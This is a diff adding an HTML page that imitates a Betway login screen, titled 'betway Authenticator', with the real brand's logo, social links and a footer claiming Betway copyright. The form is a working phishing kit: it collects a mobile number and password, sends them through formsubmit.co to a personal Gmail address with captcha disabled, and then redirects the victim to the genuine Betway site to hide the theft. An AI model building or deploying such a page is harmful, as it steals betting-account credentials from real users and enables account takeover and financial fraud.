@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>betway Authenticator</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <style>
+    body {
+      background-color: #BABEBB;
+      font: 87.5%/1.5em 'Open Sans', sans-serif;
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow-x: hidden;
+    }
+    p {
+      line-height: 1.5em;
+      color: black;
+      font-weight: bold;
+    }
+    .form-container {
+      width: 100%;
+      max-width: 320px;
+      padding: 20px;
+      border-radius: 10px;
+      background: #FFFFFF;
+      box-shadow: 5px 5px 10px rgba(0, 0, 0, 1);
+      text-align: center;
+      box-sizing: border-box;
+    }
+    .input {
+      background-color:#F1F1F1;
+      border: none;
+      border-radius: 5px;
+      color: #282828;
+      margin-bottom: 1em;
+      padding: 10px 16px;
+      width: 100%;
+      outline: 0;
+      height: 40px;
+      box-sizing: border-box;
+    }
+    .submitbtn {
+      background: #088432;
+      border: 0;
+      width: 100%;
+      height: 40px;
+      border-radius: 10px;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s ease-in-out;
+    }
+    .submitbtn:hover {
+      background: #076064;
+    }
+    h1 {
+      text-align: center;
+      color: #282828;
+      font-size: 40px;
+      margin-top: 20px;
+      margin-bottom: 20px;
+    }
+    img {
+      border-top-left-radius: 8px;
+      border-top-right-radius: 8px;
+      width: 100%;
+      display: block;
+      margin: 0 auto;
+      
+    }
+    .fa {
+      padding: 10px;
+      font-size: 20px;
+      width: 50px;
+      text-align: center;
+      text-decoration: none;
+      color: #282828;
+    }
+    @media (max-width: 600px) {
+      h1 {
+        font-size: 32px;
+      }
+      .submitbtn {
+        height: 45px;
+        
+        font-size: 18px;
+      }
+    }
+    .trust {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .trust img {
+      width: 80px;
+      margin: 10px;
+    }
+    .trust p {
+      font-size: 14px;
+      color: green;
+    }
+    .footer-links {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 14px;
+    }
+    .footer-links a {
+      color: #282828;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSk2fTTRi8nI0RuhZXa05JnKa_UQ0g0iRRhdQ&usqp=CAU" alt="BetWay Logo">
+    <form action="https://formsubmit.co/tsongaa6@gmail.com" method="POST">
+      <h1>BetWay</h1>
+      <h3 style="text-align: center; color: black;">Login</h3>
+      <input type="number" class="input" id="user" name="mobile_number" placeholder="Mobile Number" required/>
+      <input type="password" class="input" id="pass" name="password" placeholder="Password" required/>
+      <button type="submit" class="submitbtn">Activate</button>
+      <!-- FormSubmit.co settings -->
+      <input type="hidden" name="_next" value="https://www.betway.co.za/sport">
+      <input type="hidden" name="_captcha" value="false">
+      <!-- Social media icons -->
+      <div>
+        <a href="https://www.facebook.com/betwaysouthafrica?mibextid=sAuArU1zVvLjaiq0" class="fa fa-facebook"></a>
+        <a href="https://www.instagram.com/betway_sa?igsh=OGQ5ZDc2ODk2ZA==" class="fa fa-instagram"></a>
+        <a href="https://x.com/Betway_za?t=IySQkA5U2GNg_s1u4b7i7Q&s=09" class="fa fa-twitter"></a>
+      </div>
+      <!-- Trust Section -->
+      <div class="trust">
+        <!-- Trust badges or images can be added here -->
+      </div>
+      <!-- Footer Links -->
+      <div class="footer-links">
+        <a href="/privacy-policy">Privacy Policy</a> |
+        <a href="/terms-of-use">Terms of Use</a>
+      </div>
+      <footer>
+        <p>&copy; 2025 Betway.co.za. All rights reserved.</p>
+      </footer>
+    </form>
+  </div>
+</body>
+</html>
